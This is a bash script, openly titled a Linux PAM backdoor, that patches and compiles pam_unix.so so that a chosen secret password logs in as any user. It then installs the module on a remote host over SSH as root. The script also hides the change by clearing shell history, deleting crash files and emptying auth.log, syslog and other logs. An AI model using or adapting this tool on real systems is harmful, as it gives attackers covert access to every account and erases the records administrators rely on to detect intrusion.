#Linux PAM Backdoor
#
#Description: 	This program allows you to generate a pam_unix.so module for PAM using linux OS 
#		and allow you to authenticate as anyone with the secret password. This is also 
#		assuming the application that you authenticate through uses PAM.
#
#Requirements:	SSH access as root. File cannot not be inserted otherwise.
#
#Usage: 	./backdoor.sh -v <versionofPAM> -p <secretpassword>
#		-v 	This is the version of PAM of the target machine
#		-p	This is the password of your choice
#
#Author:	Thomas Slota
#
#!/bin/bash

SECRETPASS=
VERSION=
DIRECTORY=$PWD

echo -e "\nPam-Backdoor"

##################
# Usage Function #
##################
function show_help {
        echo ""
        echo "Example usage: ./backdoor.sh -v 1.3.0 -p makepass"
}

###############
# Usage Check #
###############
while getopts ":h:?:p:v:" opt; do
    case "$opt" in
    h|\?)
        show_help
        exit 0
        ;;
    v)  VERSION="$OPTARG"
        ;;
    p)  SECRETPASS="$OPTARG"
        ;;
    esac
done

shift $((OPTIND-1))

[ "$1" = "--" ] && shift

if [ -z $VERSION ]; then
        show_help
        exit 1
fi;

if [ -z $SECRETPASS ]; then
        show_help
        exit 1
fi;

######################
# Download PAM Files #
#######################
echo '+++++++++++++++ Retrieve Pam Files +++++++++++++++\n'
mirror_url="http://www.linux-pam.org/library/Linux-PAM-${VERSION}.tar.gz"
echo 'Fetching from '$mirror_url
wget $mirror_url
tar zxf Linux-PAM-"${VERSION}".tar.gzr
cd Linux-PAM-"${VERSION}"

##############################################
# Write changes to pam_unix_auth and Compile #
##############################################
sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif(strcmp(p,"'$SECRETPASS'")==0){retval=PAM_SUCCESS;}/g' modules/pam_unix/pam_unix_auth.c
./configure && make

################################################################
# Move pam_unix.so and Delete the rest of Downloaded PAM Files #
################################################################
mv modules/pam_unix/.libs/pam_unix.so $DIRECTORY
cd .. && rm -rf Linux-PAM-"${VERSION}"*
clear

##################################
# Copy and Insert in Remote Host #
##################################

TARGETIP=
#This will do the normal copy with scp, but also overwtie log files that track new module insert
SCRIPT="cd /root/; sudo cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.old; sudo cp pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so; rm pam_unix.so; rm /var/crash/*; history -c; exit"
CLEANSCRIPT="cd /var/log/; > apport.log; > kern.log; > syslog; > auth.log; history -c; exit"

function copy_insert {
	
	# prompt for ip
	echo -n "What is the remote host's IP? "
	read TARGETIP
	echo ""

	# scp file to remote host
	echo "This is copying the file to remote host via SCP."
	scp pam_unix.so root@${TARGETIP}:/root/pam_unix.so
	echo ""
 
	# move file accordingly with sudo password
	echo "SSH into remote host and insert new file. Also does cleanup."
	ssh -t root@${TARGETIP} "${SCRIPT}"
	echo ""
	
	# overwrite common log files with null
	echo -n "Clean up target machine log files (y/n)? "
	read answer
	if [ "$answer" != "${answer#[Yy]}" ] ;then
	    ssh -t root@${TARGETIP} "${CLEANSCRIPT}"
	fi


}

##################################
# Copy / Insert / Cleanup Prompt #
##################################
echo "Next, copy file to system via SSH and insert it."
echo "Note: Root authentication into SSH required"
echo ""

# prompt for copy_insert function
echo -n "Copy pam_unix file to remote host with SCP (y/n)? "
read answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    copy_insert
fi

echo "Finished!"
